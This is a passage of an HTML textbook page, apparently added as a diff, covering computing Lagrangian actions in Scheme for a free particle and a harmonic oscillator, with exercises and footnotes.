@@ -1,0 +1,564 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-10.html">previous</a></span><span>, <a href="book-Z-H-12.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_1.4"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_1.4">1.4&nbsp;&nbsp;Computing Actions</a></h2>
+<p>
+<a name="%_idx_314"></a><a name="%_idx_316"></a>
+To illustrate the above ideas, and to introduce their formulation as
+computer programs, we consider the simplest mechanical system -- a
+<a name="%_idx_318"></a><a name="%_idx_320"></a>free particle moving in three dimensions.  Euler and Lagrange discovered that for
+a free particle the time integral of the kinetic energy over the
+particle's actual path is smaller than the same integral along any
+alternative path between the same points: a free particle moves
+according to the principle of stationary action, provided we take the
+<a name="%_idx_322"></a><a name="%_idx_324"></a>Lagrangian to be the kinetic energy.  The kinetic energy for a particle of
+mass <em>m</em> and velocity <img src="chap1-Z-G-D-10.gif" border="0"> is  (1/2) <em>m</em> <em>v</em><sup>2</sup>, where <em>v</em> is the
+magnitude of <img src="chap1-Z-G-D-10.gif" border="0">.  In this case we can choose the generalized
+coordinates to be the ordinary rectangular coordinates.  </p>
+<p>
+<a name="%_idx_326"></a><a name="%_idx_328"></a>Following Euler and Lagrange, the Lagrangian for the free particle is<a name="call_footnote_Temp_39" href="#footnote_Temp_39"><sup><small>26</small></sup></a>
+<a name="EQUATION_1.14"></a></p>
+<div align=left><img src="chap1-Z-G-24.gif" border="0"></div>
+<p>
+where the formal parameter <em>x</em> names a tuple of components of the position
+with respect to a given rectangular coordinate system, and the
+formal parameter <em>v</em> names a tuple of velocity components.<a name="call_footnote_Temp_40" href="#footnote_Temp_40"><sup><small>27</small></sup></a></p>
+<p>
+We can express this formula as a procedure:
+</p>
+<p><tt><a name="%_idx_342"></a>(define&nbsp;((L-free-particle&nbsp;mass)&nbsp;local)<br>
+&nbsp;&nbsp;(let&nbsp;((v&nbsp;(velocity&nbsp;local)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(*&nbsp;1/2&nbsp;mass&nbsp;(dot-product&nbsp;v&nbsp;v))))<br>
+</p>
+</tt>
+<p>The definition indicates that <tt>L-free-particle</tt> is a procedure that takes mass
+as an argument and returns a procedure that takes a local tuple <tt>local</tt>,<a name="call_footnote_Temp_41" href="#footnote_Temp_41"><sup><small>28</small></sup></a>
+extracts the generalized velocity with the procedure <tt>velocity</tt>,
+and uses the velocity to compute the value of the Lagrangian.</p>
+<p>
+
+Suppose we let <em>q</em> denote a coordinate path function that maps time
+to position components:<a name="call_footnote_Temp_42" href="#footnote_Temp_42"><sup><small>29</small></sup></a>
+<a name="EQUATION_1.15"></a></p>
+<div align=left><img src="chap1-Z-G-25.gif" border="0"></div>
+<p>
+We can make this definition<a name="call_footnote_Temp_43" href="#footnote_Temp_43"><sup><small>30</small></sup></a>
+</p>
+<p><tt>(define&nbsp;q<br>
+&nbsp;&nbsp;(up&nbsp;(literal-function&nbsp;'x)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(literal-function&nbsp;'y)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(literal-function&nbsp;'z)))<br>
+</p>
+</tt>
+<p><a name="%_idx_372"></a>where <tt>literal-function</tt> makes a
+procedure that represents a function of one argument that has no known
+properties other than the given symbolic name.
+The symbol <tt>q</tt> now names a procedure of one real argument (time)
+that produces a tuple of three components representing the coordinates
+at that time.  For example, we can evaluate this procedure
+for a symbolic time <tt>t</tt> as follows:
+</p>
+<p><tt>(print-expression&nbsp;(q&nbsp;'t))<br>
+<i>(up&nbsp;(x&nbsp;t)&nbsp;(y&nbsp;t)&nbsp;(z&nbsp;t))</i><br>
+</p>
+</tt>
+<p><a name="%_idx_374"></a>The procedure <tt>print-expression</tt> produces a printable form of the
+expression, and <a name="%_idx_376"></a><a name="%_idx_378"></a>simplifies
+expressions before printing them.</p>
+<p>
+The derivative of the coordinate path <em>D</em><em>q</em> is the function that maps
+time to velocity components:
+</p>
+<div align=left><img src="chap1-Z-G-26.gif" border="0"></div>
+<p>
+We can make and use the derivative of a function.<a name="call_footnote_Temp_44" href="#footnote_Temp_44"><sup><small>31</small></sup></a>
+For example, we can write:
+</p>
+<p><tt>(print-expression&nbsp;((D&nbsp;q)&nbsp;'t))<br>
+<i>(up&nbsp;((D&nbsp;x)&nbsp;t)&nbsp;((D&nbsp;y)&nbsp;t)&nbsp;((D&nbsp;z)&nbsp;t))</i><br>
+</p>
+</tt>
+<p>
+The function <img src="chap1-Z-G-D-9.gif" border="0"> takes a coordinate path and returns a function
+of time that gives the local tuple ( <em>t</em>, <em>q</em>(<em>t</em>), <em>D</em><em>q</em>(<em>t</em>), <tt>...</tt> ).
+We implement this <img src="chap1-Z-G-D-9.gif" border="0"> with the procedure <a name="%_idx_384"></a><tt>Gamma</tt>.  Here is
+what <tt>Gamma</tt> does:
+</p>
+<p><tt>(print-expression&nbsp;((Gamma&nbsp;q)&nbsp;'t))<br>
+<i>(up&nbsp;t<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;(x&nbsp;t)&nbsp;(y&nbsp;t)&nbsp;(z&nbsp;t))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;((D&nbsp;x)&nbsp;t)&nbsp;((D&nbsp;y)&nbsp;t)&nbsp;((D&nbsp;z)&nbsp;t)))</i><br>
+</p>
+</tt>
+<p>
+So the composition <em>L</em> <small>o</small> <img src="chap1-Z-G-D-9.gif" border="0"> is a function of time that returns the
+value of the Lagrangian for this point on the path:<a name="call_footnote_Temp_45" href="#footnote_Temp_45"><sup><small>32</small></sup></a>
+</p>
+<p><tt>(print-expression&nbsp;<br>
+&nbsp;&nbsp;((compose&nbsp;(L-free-particle&nbsp;'m)&nbsp;(Gamma&nbsp;q))&nbsp;'t))<br>
+<i>(+&nbsp;(*&nbsp;1/2&nbsp;m&nbsp;(expt&nbsp;((D&nbsp;x)&nbsp;t)&nbsp;2))<br>
+&nbsp;&nbsp;&nbsp;(*&nbsp;1/2&nbsp;m&nbsp;(expt&nbsp;((D&nbsp;y)&nbsp;t)&nbsp;2))<br>
+&nbsp;&nbsp;&nbsp;(*&nbsp;1/2&nbsp;m&nbsp;(expt&nbsp;((D&nbsp;z)&nbsp;t)&nbsp;2)))</i><br>
+</p>
+</tt>
+<p><a name="%_idx_396"></a>The procedure <tt>show-expression</tt> is like <tt>print-expression</tt> except that it puts the simplified expression into
+traditional infix form and displays the result.<a name="call_footnote_Temp_46" href="#footnote_Temp_46"><sup><small>33</small></sup></a>  
+We use this method of display to make the boxed
+expressions in this book.  The procedure <tt>show-expression</tt> also produces the prefix
+form as returned by <tt>print-expression</tt>, 
+but we usually do not show this.<a name="call_footnote_Temp_47" href="#footnote_Temp_47"><sup><small>34</small></sup></a>
+</p>
+<p><tt>(show-expression<br>
+&nbsp;((compose&nbsp;(L-free-particle&nbsp;'m)&nbsp;(Gamma&nbsp;q))&nbsp;'t))<br>
+</p>
+</tt>
+<p></p>
+<hr>
+
+<p></p>
+<div align=left><img src="chap1-Z-G-27.gif" border="0"></div>
+<p></p>
+<hr>
+
+<p>  </p>
+<p>
+According to equation&nbsp;(<a href="book-Z-H-10.html#EQUATION_1.11">1.11</a>) 
+we can compute the Lagrangian action from time <em>t</em><sub>1</sub> to time <em>t</em><sub>2</sub> as:
+</p>
+<p><tt><a name="%_idx_398"></a>(define&nbsp;(Lagrangian-action&nbsp;L&nbsp;q&nbsp;t1&nbsp;t2)<br>
+&nbsp;&nbsp;(definite-integral&nbsp;(compose&nbsp;L&nbsp;(Gamma&nbsp;q))&nbsp;t1&nbsp;t2))<br>
+</p>
+</tt>
+<p><tt>Lagrangian-action</tt> takes as
+arguments a procedure <tt>L</tt> that computes the Lagrangian, a
+procedure <tt>q</tt> that computes a coordinate path, and starting and
+ending times <tt>t1</tt> and <tt>t2</tt>.  The <a name="%_idx_400"></a><tt>definiteintegral</tt>
+used here takes as arguments a function and two limits <tt>t1</tt> and
+<tt>t2</tt>, and computes the definite integral of the function over the
+interval from <tt>t1</tt> to <tt>t2</tt>.<a name="call_footnote_Temp_48" href="#footnote_Temp_48"><sup><small>35</small></sup></a>
+Notice that the definition of <tt>Lagrangian-action</tt> does not depend
+on any particular set of coordinates or even the dimension of the
+configuration space.  The method of computing the <a name="%_idx_406"></a><a name="%_idx_408"></a>action from the
+coordinate representation of a Lagrangian and a coordinate path does
+not depend on the coordinate system.</p>
+<p>
+We can now compute the action for the free particle along a path.  For
+example, consider a particle moving at uniform speed along a straight
+line <em>t</em> <img src="chap1-Z-G-D-11.gif" border="0"> ( 4<em>t</em>  +  7, 3<em>t</em>  +  5, 2<em>t</em>  +  1 ).<a name="call_footnote_Temp_49" href="#footnote_Temp_49"><sup><small>36</small></sup></a> We represent
+the path as a procedure
+</p>
+<p><tt>(define&nbsp;(test-path&nbsp;t)<br>
+&nbsp;&nbsp;(up&nbsp;(+&nbsp;(*&nbsp;4&nbsp;t)&nbsp;7)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(+&nbsp;(*&nbsp;3&nbsp;t)&nbsp;5)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(+&nbsp;(*&nbsp;2&nbsp;t)&nbsp;1)))<br>
+</p>
+</tt>
+<p>For a particle of mass 3, we obtain the action between <em>t</em> = 0
+and <em>t</em> = 10 as<a name="call_footnote_Temp_50" href="#footnote_Temp_50"><sup><small>37</small></sup></a>
+</p>
+<p><tt>(Lagrangian-action&nbsp;(L-free-particle&nbsp;3.0)&nbsp;test-path&nbsp;0.0&nbsp;10.0)<br>
+<i>435.</i><br>
+</p>
+</tt>
+<p>
+</p>
+<p><a name="%_thm_1.4"></a>
+<b>Exercise 1.4.</b>&nbsp;&nbsp;<strong>Lagrangian actions</strong><br>
+
+For a free particle an appropriate Lagrangian is<a name="call_footnote_Temp_52" href="#footnote_Temp_52"><sup><small>38</small></sup></a>
+</p>
+<div align=left><img src="chap1-Z-G-28.gif" border="0"></div>
+<p>
+Suppose that <em>x</em> is the constant-velocity straight-line path of a free
+particle, such that <em>x</em><sub><em>a</em></sub>  =  <em>x</em>(<em>t</em><sub><em>a</em></sub>) and <em>x</em><sub><em>b</em></sub>  =  <em>x</em>(<em>t</em><sub><em>b</em></sub>).
+Show that the action on the solution path is 
+</p>
+<div align=left><img src="chap1-Z-G-29.gif" border="0"></div>
+<p></p>
+<p>
+</p>
+
+<p></p>
+<p>
+</p>
+<a name="%_sec_Temp_53"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_53">Paths of minimum action</a></h4>
+<p><a name="%_idx_418"></a><a name="%_idx_420"></a>
+We already know that the actual path of a free particle is
+uniform motion in a straight line.  According to Euler and
+Lagrange, the action is smaller along a straight-line test
+path than along nearby paths.  Let <em>q</em> be a
+straight-line test path with action <em>S</em>[<em>q</em>](<em>t</em><sub>1</sub>, <em>t</em><sub>2</sub>).  Let <em>q</em>  + 
+<img src="chap1-Z-G-D-12.gif" border="0"> <img src="chap1-Z-G-D-13.gif" border="0"> be a
+nearby path, obtained from <em>q</em> by adding a <a name="%_idx_422"></a><a name="%_idx_424"></a>path variation <img src="chap1-Z-G-D-13.gif" border="0">
+scaled by the real parameter <img src="chap1-Z-G-D-12.gif" border="0">.<a name="call_footnote_Temp_54" href="#footnote_Temp_54"><sup><small>39</small></sup></a>
+The action on the varied path is
+<em>S</em>[<em>q</em>  +  <img src="chap1-Z-G-D-12.gif" border="0"> <img src="chap1-Z-G-D-13.gif" border="0">](<em>t</em><sub>1</sub>, <em>t</em><sub>2</sub>).  Euler and Lagrange found that <em>S</em>[<em>q</em>  +  <img src="chap1-Z-G-D-12.gif" border="0">
+<img src="chap1-Z-G-D-13.gif" border="0">](<em>t</em><sub>1</sub>, <em>t</em><sub>2</sub>) &gt; <em>S</em>[<em>q</em>](<em>t</em><sub>1</sub>, <em>t</em><sub>2</sub>) for any <img src="chap1-Z-G-D-13.gif" border="0"> that is zero at the
+endpoints and for any small nonzero <img src="chap1-Z-G-D-12.gif" border="0">.  </p>
+<p>
+Let's check this numerically by varying the test path, adding some
+amount of a test function that is zero at the endpoints <em>t</em> = <em>t</em><sub>1</sub> and
+<em>t</em> = <em>t</em><sub>2</sub>.  To make a function <img src="chap1-Z-G-D-13.gif" border="0"> that is zero at the endpoints,
+given a sufficiently well-behaved function <img src="chap1-Z-G-D-14.gif" border="0">, we can use
+<img src="chap1-Z-G-D-13.gif" border="0">(<em>t</em>)  =  (<em>t</em> <tt>-</tt> <em>t</em><sub>1</sub>)(<em>t</em> <tt>-</tt> <em>t</em><sub>2</sub>)<img src="chap1-Z-G-D-14.gif" border="0">(<em>t</em>).  This can be implemented:
+</p>
+<p><tt>(define&nbsp;((make-eta&nbsp;nu&nbsp;t1&nbsp;t2)&nbsp;t)<br>
+&nbsp;&nbsp;(*&nbsp;(-&nbsp;t&nbsp;t1)&nbsp;(-&nbsp;t&nbsp;t2)&nbsp;(nu&nbsp;t)))<br>
+</p>
+</tt>
+<p>We can use this to compute the action for a free particle over
+a path varied from the given path, as a function of <img src="chap1-Z-G-D-12.gif" border="0">:<a name="call_footnote_Temp_55" href="#footnote_Temp_55"><sup><small>40</small></sup></a>
+</p>
+<p><tt>(define&nbsp;((varied-free-particle-action&nbsp;mass&nbsp;q&nbsp;nu&nbsp;t1&nbsp;t2)&nbsp;epsilon)<br>
+&nbsp;&nbsp;(let&nbsp;((eta&nbsp;(make-eta&nbsp;nu&nbsp;t1&nbsp;t2)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(Lagrangian-action&nbsp;(L-free-particle&nbsp;mass)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(+&nbsp;q&nbsp;(*&nbsp;epsilon&nbsp;eta))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t1<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t2)))<br>
+</p>
+</tt>
+<p>The action for the varied path, with <img src="chap1-Z-G-D-14.gif" border="0">(<em>t</em>) =  ( sin <em>t</em>, cos <em>t</em>,
+<em>t</em><sup>2</sup> )
+and <img src="chap1-Z-G-D-12.gif" border="0"> = 0.001, is, as expected, larger than for the test path:
+</p>
+<p><tt>((varied-free-particle-action&nbsp;3.0&nbsp;test-path&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;sin&nbsp;cos&nbsp;square)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0&nbsp;10.0)<br>
+&nbsp;0.001)<br>
+<i>436.29121428571153</i><br>
+</p>
+</tt>
+<p>
+We can numerically compute the value of <img src="chap1-Z-G-D-12.gif" border="0"> for which the action is
+minimized.  We search between, say,  <tt>-</tt> 2 and 1:<a name="call_footnote_Temp_56" href="#footnote_Temp_56"><sup><small>41</small></sup></a>
+</p>
+<p><tt>(minimize<br>
+&nbsp;(varied-free-particle-action&nbsp;3.0&nbsp;test-path&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(up&nbsp;sin&nbsp;cos&nbsp;square)&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0&nbsp;10.0)<br>
+&nbsp;-2.0&nbsp;1.0)<br>
+<i>(-1.5987211554602254e-14&nbsp;435.0000000000237&nbsp;5)</i><br>
+</p>
+</tt>
+<p>We find exactly what is expected -- that the best value for <img src="chap1-Z-G-D-12.gif" border="0"> is
+zero,<a name="call_footnote_Temp_57" href="#footnote_Temp_57"><sup><small>42</small></sup></a>
+and the minimum value of the action is the action along the
+straight path.</p>
+<p>
+</p>
+<a name="%_sec_Temp_58"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_58">Finding trajectories that minimize the action</a></h4>
+<p><a name="%_idx_444"></a>
+<a name="%_idx_446"></a>We have used the variational principle to determine if a given
+trajectory is realizable.  We can also use the variational principle
+to find trajectories.  Given a set of trajectories that are
+specified by a finite number of parameters, we can search the
+parameter space looking for the trajectory in the set that best
+approximates the real trajectory by finding one that minimizes the
+action.  By choosing a good set of approximating functions we can get
+arbitrarily close to the real trajectory.<a name="call_footnote_Temp_59" href="#footnote_Temp_59"><sup><small>43</small></sup></a></p>
+<p>
+<a name="%_idx_448"></a><a name="%_idx_450"></a>One way to make a parametric path that has fixed endpoints is to use a
+polynomial that goes through the endpoints as well as a number of
+intermediate points.  Variation of the positions of the intermediate
+points varies the path; the parameters of the varied path are the
+coordinates of the intermediate positions.  The procedure <a name="%_idx_452"></a><tt>make-path</tt> constructs such a path using a <a name="%_idx_454"></a>Lagrange interpolation
+polynomial.<a name="call_footnote_Temp_60" href="#footnote_Temp_60"><sup><small>44</small></sup></a>
+The procedure <tt>make-path</tt> is called with five arguments: <tt>(make-path t0 q0 t1 q1 qs)</tt>, where
+<tt>q0</tt> and <tt>q1</tt> are the endpoints, <tt>t0</tt> and <tt>t1</tt> are
+the corresponding times, and <tt>qs</tt> is a list of intermediate
+points.</p>
+<p>
+
+Having specified a parametric path, we can construct a parametric
+<a name="%_idx_462"></a>action that is just the action computed along the parametric path:
+</p>
+<p><tt><a name="%_idx_464"></a>(define&nbsp;((parametric-path-action&nbsp;Lagrangian&nbsp;t0&nbsp;q0&nbsp;t1&nbsp;q1)&nbsp;qs)<br>
+&nbsp;&nbsp;(let&nbsp;((path&nbsp;(make-path&nbsp;t0&nbsp;q0&nbsp;t1&nbsp;q1&nbsp;qs)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(Lagrangian-action&nbsp;Lagrangian&nbsp;path&nbsp;t0&nbsp;t1)))<br>
+</p>
+</tt>
+<p>
+We can find approximate solution paths by finding parameters that
+minimize the action.  We do this minimization with a canned
+multidimensional minimization procedure:<a name="call_footnote_Temp_61" href="#footnote_Temp_61"><sup><small>45</small></sup></a>
+</p>
+<p><tt><a name="%_idx_476"></a>(define&nbsp;(find-path&nbsp;Lagrangian&nbsp;t0&nbsp;q0&nbsp;t1&nbsp;q1&nbsp;n)<br>
+&nbsp;&nbsp;(let&nbsp;((initial-qs&nbsp;(linear-interpolants&nbsp;q0&nbsp;q1&nbsp;n)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(let&nbsp;((minimizing-qs<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(multidimensional-minimize<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(parametric-path-action&nbsp;Lagrangian&nbsp;t0&nbsp;q0&nbsp;t1&nbsp;q1)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;initial-qs)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(make-path&nbsp;t0&nbsp;q0&nbsp;t1&nbsp;q1&nbsp;minimizing-qs))))<br>
+</p>
+</tt>
+<p><a name="%_idx_478"></a>The procedure <tt>multidimensional-minimize</tt> takes a procedure (in
+this case the value of the call to <tt>parametricpathaction</tt>)
+that computes the function to be
+minimized (in this case the action) and an initial guess for the
+parameters.  Here we choose the initial guess to be equally spaced
+points on a straight line between the two endpoints, computed with
+<tt>linear-interpolants</tt>.</p>
+<p>
+To illustrate the use of this strategy, we will find trajectories of
+the <a name="%_idx_480"></a><a name="%_idx_482"></a>harmonic oscillator, with Lagrangian<a name="call_footnote_Temp_62" href="#footnote_Temp_62"><sup><small>46</small></sup></a>
+<a name="EQUATION_1.16"></a></p>
+<div align=left><img src="chap1-Z-G-30.gif" border="0"></div>
+<p>
+for mass <em>m</em> and spring constant <em>k</em>.
+This Lagrangian is implemented by
+</p>
+<p><tt><a name="%_idx_488"></a>(define&nbsp;((L-harmonic&nbsp;m&nbsp;k)&nbsp;local)<br>
+&nbsp;&nbsp;(let&nbsp;((q&nbsp;(coordinate&nbsp;local))&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(v&nbsp;(velocity&nbsp;local)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(-&nbsp;(*&nbsp;1/2&nbsp;m&nbsp;(square&nbsp;v))&nbsp;(*&nbsp;1/2&nbsp;k&nbsp;(square&nbsp;q)))))<br>
+</p>
+</tt>
+<p>
+We can find an approximate path taken by the harmonic oscillator for
+<em>m</em> = 1 and <em>k</em> = 1 between <em>q</em>(0) = 1 and <em>q</em>(<img src="chap1-Z-G-D-15.gif" border="0">/2) = 0 as follows:<a name="call_footnote_Temp_63" href="#footnote_Temp_63"><sup><small>47</small></sup></a>
+</p>
+<p><tt>(define&nbsp;q&nbsp;(find-path&nbsp;(L-harmonic&nbsp;1.0&nbsp;1.0)&nbsp;0.&nbsp;1.&nbsp;:pi/2&nbsp;0.&nbsp;3))<br>
+</p>
+</tt>
+<p>
+We know that the trajectories of this harmonic
+oscillator, for <em>m</em> = 1 and <em>k</em> = 1, are
+<a name="EQUATION_1.17"></a></p>
+<div align=left><img src="chap1-Z-G-31.gif" border="0"></div>
+<p>
+where the amplitude <em>A</em> and the phase <img src="chap1-Z-G-D-16.gif" border="0"> are determined by the
+initial conditions.  For the chosen endpoint conditions the solution
+is <em>q</em>(<em>t</em>) = cos(<em>t</em>).  The approximate path should be an approximation to
+cosine over the range from 0 to <img src="chap1-Z-G-D-15.gif" border="0">/2.
+Figure&nbsp;<a href="#FIGURE_1.1">1.1</a> shows the error in the polynomial
+approximation produced by this process.  The maximum error in the
+approximation with three intermediate points is less than 1.7&times;
+10<sup><tt>-</tt>4</sup>.  We find, as expected, that the error in the approximation
+decreases as the number of intermediate points is increased.  For four
+intermediate points it is about a factor of 15 better.</p>
+<p>
+<a name="FIGURE_1.1"></a></p>
+<div align=left><img src="chap1-Z-G-32.gif" border="0"></div>
+<p></p>
+<p>
+
+</p>
+<p><a name="%_thm_1.5"></a>
+<b>Exercise 1.5.</b>&nbsp;&nbsp;<strong>Solution process</strong><br>
+<a name="%_idx_490"></a><a name="%_idx_492"></a>We can watch the progress of the minimization by modifying the
+procedure <tt>parametric-path-action</tt> to plot the path
+each time the action is computed.  Try this:
+</p>
+<p><tt>(define&nbsp;win2&nbsp;(frame&nbsp;0.&nbsp;:pi/2&nbsp;0.&nbsp;1.2))<br>
+<br>
+<a name="%_idx_494"></a>(define&nbsp;((parametric-path-action&nbsp;Lagrangian&nbsp;t0&nbsp;q0&nbsp;t1&nbsp;q1)&nbsp;<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;intermediate-qs)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(let&nbsp;((path&nbsp;(make-path&nbsp;t0&nbsp;q0&nbsp;t1&nbsp;q1&nbsp;intermediate-qs)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;;&nbsp;display&nbsp;path<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(graphics-clear&nbsp;win2)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(plot-function&nbsp;win2&nbsp;path&nbsp;t0&nbsp;t1&nbsp;(/&nbsp;(-&nbsp;t1&nbsp;t0)&nbsp;100))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;;&nbsp;compute&nbsp;action<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Lagrangian-action&nbsp;Lagrangian&nbsp;path&nbsp;t0&nbsp;t1)))<br>
+<br>
+(find-path&nbsp;(L-harmonic&nbsp;1.&nbsp;1.)&nbsp;0.&nbsp;1.&nbsp;:pi/2&nbsp;0.&nbsp;2)<br>
+<br>
+</p>
+</tt>
+<p></p>
+
+<p></p>
+<p>
+
+</p>
+<p><a name="%_thm_1.6"></a>
+<b>Exercise 1.6.</b>&nbsp;&nbsp;<strong>Minimizing action</strong><br>
+Suppose we try to obtain a path by minimizing an action for an
+impossible problem.  For example, suppose we have a free particle and
+we impose endpoint conditions on the velocities as well as the
+positions that are inconsistent with the particle being free.  Does
+the formalism protect itself from such an unpleasant attack?  You may find 
+it illuminating to program it and see what happens.
+</p>
+
+<p></p>
+<p>
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_39" href="#call_footnote_Temp_39"><sup><small>26</small></sup></a> Here we are making a function definition.  A definition
+<a name="%_idx_330"></a><a name="%_idx_332"></a>  specifies the value of the function for arbitrarily chosen formal
+parameters.  One may change the name of a formal parameter, so long as
+the new name does not conflict with any other symbol in the
+definition.  For example, the following definition specifies exactly
+the same free-particle Lagrangian: 
+</p>
+<div align=left><img src="chap1-Z-G-23.gif" border="0"></div>
+<p> </p>
+
+<p><a name="footnote_Temp_40" href="#call_footnote_Temp_40"><sup><small>27</small></sup></a> The Lagrangian is formally a function of the local tuple,
+<a name="%_idx_334"></a><a name="%_idx_336"></a><a name="%_idx_338"></a><a name="%_idx_340"></a>but any particular Lagrangian depends only on a finite initial segment
+of the local tuple.  We define functions of local tuples by explicitly
+declaring names for the elements of the initial segment of the local
+tuple that includes the elements upon which the function depends.</p>
+
+<p><a name="footnote_Temp_41" href="#call_footnote_Temp_41"><sup><small>28</small></sup></a> 
+<a name="%_idx_344"></a><a name="%_idx_346"></a><a name="%_idx_348"></a><a name="%_idx_350"></a><a name="%_idx_352"></a>  We represent the local tuple as a composite data structure, the
+components of which are the time, the generalized coordinates, the
+generalized velocities, and possibly higher derivatives.  We do not
+want to be bothered by the details of packing and unpacking the
+components into these structures, so we provide utilities for doing
+this.  The constructor <tt>-&gt;local</tt> takes the time, the coordinates,
+and the velocities and returns a data structure representing a local
+tuple. The selectors <tt>time</tt>, <tt>coordinate</tt>, and <tt>velocity</tt> extract the appropriate pieces from the local structure.
+The procedure <tt>time</tt> is the same as the procedure <tt>(component 0)</tt>, and similarly
+<tt>coordinate</tt> is <tt>(component 1)</tt> and <tt>velocity</tt> is
+<tt>(component 2)</tt>.</p>
+
+<p><a name="footnote_Temp_42" href="#call_footnote_Temp_42"><sup><small>29</small></sup></a> Be careful.  The <em>x</em> in the definition of <em>q</em> is not the
+<a name="%_idx_354"></a>same as the <em>x</em> that was used as a formal parameter in the definition
+of the free-particle Lagrangian above.  There are only so many letters
+in the alphabet, so we are forced to reuse them.  We will be
+careful to indicate where symbols are given new meanings.</p>
+
+<p><a name="footnote_Temp_43" href="#call_footnote_Temp_43"><sup><small>30</small></sup></a> A tuple of coordinate or velocity components is made with 
+<a name="%_idx_356"></a><a name="%_idx_358"></a><a name="%_idx_360"></a><a name="%_idx_362"></a><a name="%_idx_364"></a><a name="%_idx_366"></a><a name="%_idx_368"></a><a name="%_idx_370"></a>  the procedure <tt>up</tt>.  Component <tt>i</tt> of the tuple
+<tt>q</tt> is <tt>(ref q i)</tt>.  All indexing is zero based.  The word
+<tt>up</tt> is to remind us that in mathematical notation these 
